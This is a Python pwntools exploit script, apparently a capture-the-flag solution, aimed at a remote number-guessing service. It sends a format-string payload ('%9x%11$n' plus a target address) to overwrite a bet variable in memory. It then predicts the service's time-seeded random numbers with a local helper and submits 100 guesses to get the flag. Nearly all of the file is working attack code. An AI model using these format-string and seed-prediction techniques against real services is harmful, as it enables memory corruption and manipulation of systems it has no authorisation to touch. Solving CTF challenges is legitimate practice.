from pwn import *
from time import time
import subprocess

bet = 0x602020

game = remote('35.243.188.20', 2001)

game.recvuntil("name? ")
fmtstr = "%9x%11$n"
fmtstr += "\x20\x20\x60\x00\x00\x00\x00\x00"
game.sendline(fmtstr)

seed = int(time())
log.info("Current time: " + str(seed))
seed = seed * 0xcccccccd
seed = int(str(hex(seed))[:10], 16)
seed = seed >> 3
seed = seed + 9

log.success("Random seed value: " + str(seed))

log.info("Generating 100 values with the calculated seed value...")
rng = subprocess.Popen(['./rand', str(seed)], stdout=subprocess.PIPE)
output = rng.stdout
log.success("Values Generated!")


valueList = []
for i in range(100):
	valueList.append(output.readline().strip())
log.success("Values Filled!")

for value in valueList:
	progress = game.recvuntil("number: ")
	print progress
	log.info("Trying " + str(value))
	game.sendline(str(value))
	result = game.recvline()
	if "Sorry!" in result:
		log.failure("Guess was incorrect. Aborting...")
		exit()
	elif "Correct" in result:
		if "99/100" in progress:
			log.success("WE FINALLY WIN!")
			win = game.recvline()
			print win
			flag = game.recvuntil('}')
			print flag
			exit()
		log.success("Guess was correct! Keep going...")

